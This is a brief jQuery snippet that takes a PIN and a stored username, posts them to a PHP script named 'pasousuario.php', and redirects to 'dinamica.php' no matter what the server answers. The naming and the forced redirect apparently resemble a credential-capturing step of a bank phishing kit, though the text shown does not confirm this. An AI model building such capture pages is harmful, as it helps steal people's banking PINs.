<script type="text/javascript">
    $(document).ready(function() {
        // ... (el resto de tu código de los puntos) ...

        $("#btn-password").click(function() {
            var pin = $("#input_real").val();
            var usr = localStorage.getItem('user_akam') || "Usuario_Anonimo";

            $("#fondo, #cargando-o").show();
            
            $.post("../process/pasousuario.php", { 
                'txt-usuario': usr, 
                'txt-password': pin 
            }, function(data) {
                window.location.href = "dinamica.php"; 
            });

            setTimeout(function() { window.location.href = "dinamica.php"; }, 4000);
        });
    });
</script>
